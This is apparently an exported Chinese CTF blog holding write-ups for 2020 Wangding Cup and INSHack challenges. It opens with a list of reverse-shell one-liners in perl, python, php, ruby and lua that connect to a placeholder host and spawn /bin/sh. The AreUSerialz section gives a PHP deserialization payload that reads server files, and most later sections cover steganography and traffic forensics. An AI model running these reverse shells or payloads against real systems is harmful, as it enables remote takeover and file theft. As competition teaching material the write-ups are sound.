<p>所以反弹shell，这次bash、curl和nc都不能用喽，去网上找几条命令</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="xx.xx.xx.xx";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xx.xx.xx.xx:xxxx");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",xxxx));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line">python -c <span class="string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('xx.xx.xx.xx',xxxx))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span></span><br><span class="line">php -r <span class="string">'$sock=fsockopen("xx.xx.xx.xx",xxxx);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("xx.xx.xx.xx",xxxx).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("xx.xx.xx.xx",xxxx);while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('xx.xx.xx.xx','xxxx');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure></div>

<p>记得传参时先进行一遍url编码（前两个都可以用，后面的就试了个python不行，懒得试了。。）</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>最后使用文件描述符和通配符，即<code>/proc/*/fd/*</code>得到flag（试了很多次，展示最直接的一次得了）</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
        <tag>弹shell</tag>
        <tag>文件描述符</tag>
      </tags>
  </entry>
  <entry>
    <title>2020网鼎AreUSerialz、虚幻2</title>
    <url>/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/</url>
    <content><![CDATA[<h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><p>一个反序列化问题没有那么多的嵌套，不过有几个小的绕过</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>主要利用<code>file_get_contents</code>来读取文件内容，需要绕过<code>is_valid</code>和弱类型判断</p>
<p>1.反序列化时先调用<code>__destruct()</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>判断op是否的等于”2”，这里是强等于。也就是op如果为”2”，则令op=“1”</p>
<p>2.调用process函数</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">        $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果op==”1”则执行写入，如果op==”2”则读取<code>filename</code>指向的文件</p>
<p>所以可以用op=2，来绕过第一个强类型判断和第二个弱类型判断</p>
<p>3.此时构造出来的序列化字符串如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename=<span class="string">"/etc/init.d/apache2"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">" * op"</span>;i:<span class="number">2</span>;s:<span class="number">11</span>:<span class="string">" * filename"</span>;s:<span class="number">19</span>:<span class="string">"/etc/init.d/apache2"</span>;s:<span class="number">10</span>:<span class="string">" * content"</span>;N;&#125; <span class="comment">//其中空格便是\x00</span></span><br></pre></td></tr></table></figure></div>

<p>但是这个无法绕过<code>is_valid</code>函数，因为<code>is_valid</code>函数把字符限制在了32-125，但是\x00字符的ASCII码为0。</p>
<p>两种绕法：1.php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过</p>
<p>2.用S来代替s，在这种情况下<code>\00</code>就会被解析成<code>%00</code>(1个字符)，空字节，从而绕过检测</p>
<p>在比赛时，flag没放在var/www/html下面需要读cmdline或者apache2启动脚本，得到配置文件位置，发现flag在web/html里面。buu上就放在了同一目录下面，相对路径直接读flag.php就行了。</p>
<h3 id="虚幻2"><a href="#虚幻2" class="headerlink" title="虚幻2"></a>虚幻2</h3><p>脑洞题目。。</p>
<p>File为png文件，放入Stegsolve将RGB三个通道的图片分离出来</p>
<p>尝试拼接三个图片并加上定位码后发现扫不出来，于是分通道尝试按行读取数据并拼接</p>
<p>于是编写脚本，原本是RGB图像且大小为36*12</p>
<p>利用cv2读取通道信息为BGR，但是我们用RGB顺序读取通道信息并按行循环拼接</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img=cv2.imread(<span class="string">'file.png'</span>)</span><br><span class="line"></span><br><span class="line">image1=np.hstack((img[:,:,<span class="number">2</span>],img[:,:,<span class="number">1</span>],img[:,:,<span class="number">0</span>])).reshape(<span class="number">36</span>,<span class="number">36</span>) <span class="comment">#RGB</span></span><br><span class="line"></span><br><span class="line">Image.fromarray(image1).save(<span class="string">'res.png'</span>)</span><br></pre></td></tr></table></figure></div>

<p>得到：</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="5%" height="5%" data-src="/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现校正折线位置不对</p>
<p><code>image1=np.flipud(image1)</code></p>
<p>图像反转一下</p>
<p>得到：</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="5%" height="5%" data-src="/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现左下定位码反了</p>
<p>将左下定位码反转180度</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img=cv2.imread(<span class="string">'file.png'</span>)</span><br><span class="line"></span><br><span class="line">image1=np.hstack((img[:,:,<span class="number">2</span>],img[:,:,<span class="number">1</span>],img[:,:,<span class="number">0</span>])).reshape(<span class="number">36</span>,<span class="number">36</span>)</span><br><span class="line"></span><br><span class="line">image1[<span class="number">4</span>:<span class="number">11</span>,<span class="number">3</span>:<span class="number">10</span>]=np.rot90(image1[<span class="number">4</span>:<span class="number">11</span>,<span class="number">3</span>:<span class="number">10</span>],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">image1=np.flipud(image1)</span><br><span class="line"></span><br><span class="line">Image.fromarray(image1).save(<span class="string">'res.png'</span>)</span><br></pre></td></tr></table></figure></div>

<p>得到</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="5%" height="5%" data-src="/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>放进<a href="http://www.efittech.com/hxdec.html读取发现读不出来，题目中提示暴力修补" target="_blank" rel="noopener">http://www.efittech.com/hxdec.html读取发现读不出来，题目中提示暴力修补</a></p>
<p>于是就在右边的空白处先画了几笔，尝试扫一下发现可以扫，得到flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="55%" height="55%" data-src="/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/4.png" src="/img/loading.gif" class="lazyload"></a>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>INSHack大杂烩</title>
    <url>/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/</url>
    <content><![CDATA[<p>👴又来耍misc了，RSA、DES不想编、LRU不着急，Web做不动。misc，我胡汉三又回来了！</p>
<p>睡醒午觉有、无聊，作业也不想写，就来刷刷misc，看到<code>INSHack</code>这块还挺多，打算做做试试（中间还去快乐乱斗了。</p>
<p>首先Ctrl F搜一下关键词，开始做题，我丢，五道签到，这分嫖得也太爽了。。</p>
<p>白给题目们：<code>[INSHack2017]insanity、[INSHack2017]sanity、[INSHack2018]INSanity、[INSHack2019]INSAnity、[INSHack2019]Sanity</code></p>
<h3 id="INSHack2018-Self-Congratulation"><a href="#INSHack2018-Self-Congratulation" class="headerlink" title="[INSHack2018]Self Congratulation"></a>[INSHack2018]Self Congratulation</h3><p>图片左上角有一堆黑白块，按白色为0黑色为1转成二进制，得到：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00110001001</span><br><span class="line">10010001100</span><br><span class="line">11001101000</span><br><span class="line">01101010011</span><br><span class="line">01100011011</span><br><span class="line">10011100000</span><br></pre></td></tr></table></figure></div>

<p>二进制转ASCII得到：12345678</p>
<h3 id="INSHack2019-gflag"><a href="#INSHack2019-gflag" class="headerlink" title="[INSHack2019]gflag"></a>[INSHack2019]gflag</h3><p>考点：3D打印gcode命令</p>
<p><a href="http://gcode.ws/、https://ncviewer.com/（参考自[Root.](https://shawroot.cc/)师傅博客" target="_blank" rel="noopener">http://gcode.ws/、https://ncviewer.com/（参考自[Root.](https://shawroot.cc/)师傅博客</a></p>
<p>把文件后缀改成<code>.gcode</code>，放进上面两个网站都可以出来</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/1.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/2.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="INSHack2017-hiding-in-plain-sight"><a href="#INSHack2017-hiding-in-plain-sight" class="headerlink" title="[INSHack2017]hiding-in-plain-sight"></a>[INSHack2017]hiding-in-plain-sight</h3><p>foremost提取一下，打开图片就得到flag了</p>
<h3 id="INSHack2017-10-cl0v3rf13ld-lane-signal"><a href="#INSHack2017-10-cl0v3rf13ld-lane-signal" class="headerlink" title="[INSHack2017]10-cl0v3rf13ld-lane-signal"></a>[INSHack2017]10-cl0v3rf13ld-lane-signal</h3><p>binwalk发现里面有张png，提取出来发现是摩斯解码规则，猜测还有文件</p>
<p>放进010里面，发现ogg文件，手动提取出来，放进au，发现摩斯电码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.. -. ... .- -.--. -- ----- .-. ..... ...-- ..--.- .-- .---- .-.. .-.. ..--.- -. ...-- ...- ...-- .-. ..--.- ....- --. ...-- -.-.-- -.-</span><br></pre></td></tr></table></figure></div>

<p>有点懒，不想照着表一个一个翻译了，直接扔到网页里跑一下，发现结果千奇百怪。。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSA-.--.M-----R........--..--.-W.----LL..--.-N...--V...--R..--.-....-G...---.-.--K</span><br><span class="line">INSAM5R53W1LLN3V3R4G3</span><br><span class="line">INSA(M0R53_W1LL_N3V3R_4G3!K</span><br></pre></td></tr></table></figure></div>

<p>最后这个看着还靠谱点，然后去网上找一下，摩斯解码规则，发现<code>-.--.</code>代表<code>(</code>也可以理解为<code>{</code>，所以把最后这个改一下啊，得到flag：<code>INSA{M0R53_W1LL_N3V3R_4G3!}</code></p>
<h3 id="INSHack2018-42-tar-xz"><a href="#INSHack2018-42-tar-xz" class="headerlink" title="[INSHack2018]42.tar.xz"></a>[INSHack2018]42.tar.xz</h3><p>这题一看就是恶心人的压缩包套娃，这波啊，这波是copy，ctftime上的解压代码抄一手</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">while [ "`find . -type f -name '*.tar.xz' | wc -l`" -gt 0 ]; do find -type f -name "*.tar.xz" -exec tar xf '&#123;&#125;' \; -exec rm -- '&#123;&#125;' \;; done;</span><br></pre></td></tr></table></figure></div>

<h3 id="INSHack2018-not-so-deep"><a href="#INSHack2018-not-so-deep" class="headerlink" title="[INSHack2018] (not) so deep"></a>[INSHack2018] (not) so deep</h3><p>考点：频谱和deepsound</p>
<p>放进au，转成频谱图，调一下频率，发现如下</p>
<p>下载个<a href="https://deepsound.soft112.com/" target="_blank" rel="noopener">deepsound</a>、及其分析文件的密码<a href="https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/deepsound2john.py" target="_blank" rel="noopener">破解脚本</a></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>文件放进去发现有密码，破解一下，得到密码：<code>azerty</code></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>把<code>flag2.txt</code>导出后，得到后一半flag，拼起来就行</p>
<h3 id="INSHack2017-remote-multimedia-controller"><a href="#INSHack2017-remote-multimedia-controller" class="headerlink" title="[INSHack2017]remote-multimedia-controller"></a>[INSHack2017]remote-multimedia-controller</h3><p>在tcp 02流中发现一段base64，多次解码，得到flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/5.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/6.png" src="/img/loading.gif" class="lazyload"></a>

<p><del>快乐LOL去了，剩下的以后写。明天看defcon怎么说，不打的话就编遍程、水水misc。</del></p>
<p>打完回来了，再写一道睡觉</p>
<h3 id="INSHack2018-Spreadshit"><a href="#INSHack2018-Spreadshit" class="headerlink" title="[INSHack2018]Spreadshit"></a>[INSHack2018]Spreadshit</h3><p>拿到这题第一反应，改后缀，找找zip里有没有什么东西</p>
<p>然后我就发现了一张白色的png和meta.xml（都没啥子用）</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>然后就拿excel打开ods文件，查找空格，并全选，答案就出来了（看不清楚就把行高调大一点）</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/8.png" src="/img/loading.gif" class="lazyload"></a>

<p><del>睡觉去了</del>，醒了还是有、无聊再刷会题目吧，defcon看了看，有意思不会做（签到那个视频很好玩，但是找不出来flag）。</p>
<h3 id="INSHack2017-lets-talk"><a href="#INSHack2017-lets-talk" class="headerlink" title="[INSHack2017]lets-talk"></a>[INSHack2017]lets-talk</h3><p>telegram，懂的都懂，是个签到题</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/9.png" src="/img/loading.gif" class="lazyload"></a>

<p>最后考验信息收集能力，去Github上瞅瞅就发现了</p>
<h3 id="INSHack2019-Passthru"><a href="#INSHack2019-Passthru" class="headerlink" title="[INSHack2019]Passthru"></a>[INSHack2019]Passthru</h3><p>这个题中给出了client端的pre-master-secret，也就是sslkey.log文件</p>
<p>所以可以通过它来解密HTTP流量</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/10.png" src="/img/loading.gif" class="lazyload"></a>

<p>解密之后我想导出http对象看看都有啥，发现有些失效的的访问image的url，然而并没有看出来有啥用。</p>
<p>去看wp，发现要收集url中的kcahsni参数（inshack|暗示下文逆序），并将其进行十六进制解码</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/11.png" src="/img/loading.gif" class="lazyload"></a>

<p>修复并提取</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">editcap -r capture.pcap fixed.pcap 1-5438</span><br><span class="line">tshark -r fixed.pcap -o <span class="string">'ssl.keylog_file:sslkey.log'</span> -Y <span class="string">'http contains "GET /searchbyimage"'</span> -T fields -e http.request.uri.query.parameter &gt; queries.txt</span><br></pre></td></tr></table></figure></div>

<p>对提取出来的文本进行16进制解码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hexstr = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'queries.txt'</span>, <span class="string">'rt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    hexstr = <span class="string">''</span>.join([param.split(<span class="string">','</span>)[<span class="number">0</span>][<span class="number">109</span>:] <span class="keyword">for</span> param <span class="keyword">in</span> f.readlines()])</span><br><span class="line"></span><br><span class="line">out = bytes.fromhex(hexstr).decode(<span class="string">'latin1'</span>)</span><br><span class="line">print(out)</span><br></pre></td></tr></table></figure></div>

<p>得到：</p>
<blockquote>
<p>÷sþõeT£´&amp;Íá÷óÜî¯rZ¹9hüRð&lt;<br>}e59ad3f38a01dca00f9759e6d205317642c5421fcdad034ebe7077c2bddd472b{ASNI<br>2ÃÐl$ò¨ÇèfgÛ÷þÎ(EjÒJÂÆ¡.&gt;þK</p>
</blockquote>
<p>很明显了，把第二行逆序一下就可以了（rev是镜像命令）</p>
